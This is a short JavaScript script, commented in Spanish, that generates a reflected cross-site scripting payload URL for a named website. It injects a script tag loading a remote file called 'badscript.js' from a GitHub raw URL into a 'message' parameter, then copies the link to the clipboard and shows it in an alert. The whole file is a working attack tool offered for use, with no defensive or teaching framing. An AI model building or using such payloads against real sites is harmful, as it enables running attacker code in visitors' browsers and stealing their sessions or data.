// Script para generar payload XSS reflected
function generateXSSPayload() {
    const baseUrl = 'https://www.dr-farfar.com/';
    https://www.dr-farfar.com/
    const message = '<script src=https://raw.githubusercontent.com/Accdecer/RepositoriodeAccde/refs/heads/main/badscript.js></script>';
    
    // URL encode del mensaje para evitar problemas
    const encodedMessage = encodeURIComponent(message);
    
    const fullPayload = `${baseUrl}?message=${encodedMessage}`;
    
    console.log('Payload generado:');
    console.log(fullPayload);
    
    // Copia al clipboard
    navigator.clipboard.writeText(fullPayload).then(() => {
        console.log('✅ Payload copiado al clipboard');
    });
    
    // También lo muestra en una alerta para fácil copia
    alert('Payload:\n' + fullPayload);
}

// Ejecutar automáticamente o llamarlo manualmente
generateXSSPayload();
